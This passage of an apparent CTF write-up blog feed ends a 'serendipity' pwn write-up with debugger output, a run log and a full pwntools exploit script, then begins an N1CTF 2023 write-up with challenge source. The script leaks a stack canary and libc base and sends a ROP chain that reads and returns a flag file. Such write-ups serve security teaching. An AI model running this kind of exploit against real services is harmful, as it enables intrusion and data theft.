   0x560df4890e63                             mov    rdx, qword ptr [rbp - 8]
   0x560df4890e67                             sub    rdx, qword ptr fs:[0x28]
 ► 0x560df4890e70                           ✔ je     0x560df4890e77                &lt;0x560df4890e77&gt;
    ↓
   0x560df4890e77                             leave  
   0x560df4890e78                             ret    
    ↓
   0x7f744ca2a3e5 &lt;iconv+197&gt;                 pop    rdi
   0x7f744ca2a3e6 &lt;iconv+198&gt;                 ret    
    ↓
   0x7f744ca796a2 &lt;printf_positional+5666&gt;    pop    rdx
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7f744c1fdaf0 ◂— 0x0
01:0008│     0x7f744c1fdaf8 —▸ 0x560df598b360 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002
02:0010│     0x7f744c1fdb00 ◂— 0x0
03:0018│     0x7f744c1fdb08 ◂— 0x0
04:0020│     0x7f744c1fdb10 —▸ 0x560df594a3c0 ◂— 0x100007fa8d10002
05:0028│     0x7f744c1fdb18 —▸ 0x7f7444000b70 ◂— 0xc7ccaec0fbfe94bc
06:0030│     0x7f744c1fdb20 ◂— 0x0
07:0038│     0x7f744c1fdb28 ◂— 0x0
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x560df4890e70
   1   0x7f744ca2a3e5 iconv+197
   2   0x7f744ca796a2 printf_positional+5666
   3   0x7f744ca796a2 printf_positional+5666
   4   0x7f744ca796a2 printf_positional+5666
──────────────────────────────────────────────────────────────────────────────────[ THREADS (3 TOTAL) ]──────────────────────────────────────────────────────────────────────────────────
  ► 3   &#34;serendipity_pat&#34; stopped: 0x560df4890e70
    1   &#34;serendipity_pat&#34; stopped: 0x7f744cb1b82d &lt;select+349&gt; 
    2   &#34;serendipity_pat&#34; stopped: 0x7f744cae57f8 &lt;clock_nanosleep@GLIBC_2.2.5+200&gt; 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; 
</code></pre><p>We finally assigned the respective arguments.</p>
<pre tabindex="0"><code> ► 0x7f744cb4101b &lt;__netlink_close+11&gt;        syscall  &lt;SYS_sendto&gt;
        fd: 0xb (socket:[153083])
        buf: 0x7f744cc1a8c8 (buffer) ◂— &#39;server_flag\n&#39;
        n: 0xc
        flags: 0x0
        addr: 0x560df594a3c0 ◂— 0x100007fa8d10002
        addr_len: 0x10
   0x7f744cb4101d &lt;__netlink_close+13&gt;        ret  
</code></pre><p>Result:</p>
<pre tabindex="0"><code>╭─    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1 ✘  w1n_gl0ry@phis1Ng ─╮
╰─ python3 remote.py                                                                                                                                               ─╯
[*] &#39;/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0 on port 9981: Done
bc94fefbc0aeccc762678d353d911917c32ce5266a0df70afd4bef072fb147ec
b&#39;auth successfully\n&#39;
[*] canary: 0x63648f5a8f209500
[*] libc.address: 0x7f744ca00000
[*] Paused (press any to continue)
b&#34;In the moon&#39;s tender embrace, shadows waltz in a silvery dance, weaving dreams with a gentle trance.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;
[*] Switching to interactive mode
file can&#39;t be read
server_flag
$ 
</code></pre><h2 id="exploit-script-1">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket 
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;157.245.147.89&#39;, 24210, typ=&#34;udp&#34;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">9981</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;udp&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x301</span>, <span style="color:#ae81ff">0x101</span>, <span style="color:#ae81ff">0x201</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printdata</span>(size, data):
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>data
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>plain<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genarate_rand_string</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, data<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> plain
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        plain<span style="color:#f92672">+=</span>p8(glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)    
</span></span><span style="display:flex;"><span>    print(plain<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">authenticate</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> session
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>plain
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    print(data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>genarate_rand_string()  
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>authenticate()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(a)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pause()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># printdata(0xfff, b&#39;A&#39;*0xfff)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(io.recv())</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># data=io.recv(0x1000)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># heap=u64(data[4:10].ljust(8, b&#39;\0&#39;)) - 0x4ba0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(heap))</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>data[<span style="color:#ae81ff">265</span>:])
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;canary: &#34;</span> <span style="color:#f92672">+</span> hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>data[<span style="color:#ae81ff">265</span>:]
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">264</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x94ac3</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc.address: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000045eb0</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span>next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002a3e5</span>
</span></span><span style="display:flex;"><span>pop_rsi<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002be51</span>
</span></span><span style="display:flex;"><span>pop_rdx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x00000000000796a2</span>
</span></span><span style="display:flex;"><span>mov_rdi_rdx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000149709</span>
</span></span><span style="display:flex;"><span>mov_r8_rbx<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000121f8a</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>pop_rcx_rbx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000108b04</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span>pop_rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>xchg_edi_eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000009198d</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>mov_rax_r8<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000011db23</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>syscall<span style="color:#f92672">=</span><span style="color:#ae81ff">0x14101b</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi) 
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">8319607999311079471</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">29099040799945317</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(xchg_edi_eax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rsi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rcx_rbx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">0xb</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rax)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">44</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(syscall)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x500</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p64(leak)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>pl
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embraceaaa&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>print(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title>N1CTF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/n1ctf/</link>
      <pubDate>Tue, 24 Oct 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/n1ctf/</guid>
      <description><![CDATA[<h1 id="introduction">Introduction</h1>
<p>Rating weight: 97,33</p>
<p>During weekends, I played the N1CTF contest with my teammate <code>cauca</code>. We ranked in the top 45 and I solved 1/4 of the problems in the <code>PWN</code> category.</p>
<p><img src="https://hackmd.io/_uploads/Byh_XerIT.png" alt="image"></p>
<h1 id="n1-canary">N1-CANARY</h1>
<p>After the contest, I asked the author for the source of the challenge to make it easier to debug.
<code>main.cpp</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;sys/random.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;memory&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">constexpr</span> size_t CANARY_RANDBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_SHIFTBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_POOL_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> CANARY_RANDBITS;
</span></span><span style="display:flex;"><span>u64 user_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span>u64 sys_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>size_t SIZE<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ProtectedBuffer</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  u64 canary;
</span></span><span style="display:flex;"><span>  ProtectedBuffer() {
</span></span><span style="display:flex;"><span>    bzero(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> getCanary();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  u64 <span style="color:#a6e22e">getCanary</span>() {
</span></span><span style="display:flex;"><span>    u64 addr <span style="color:#f92672">=</span> (u64)<span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>    u64 canary_idx <span style="color:#f92672">=</span> (addr <span style="color:#f92672">&gt;&gt;</span> CANARY_SHIFTBITS) <span style="color:#f92672">&amp;</span> (CANARY_POOL_SIZE <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    u64 raw_canary <span style="color:#f92672">=</span> user_canary[canary_idx] <span style="color:#f92672">^</span> sys_canary[canary_idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> raw_canary;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> getCanary()) {
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> Fn<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">void</span> mut(Fn <span style="color:#66d9ef">const</span> <span style="color:#f92672">&amp;</span>fn) {
</span></span><span style="display:flex;"><span>    fn(buf);
</span></span><span style="display:flex;"><span>    check();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
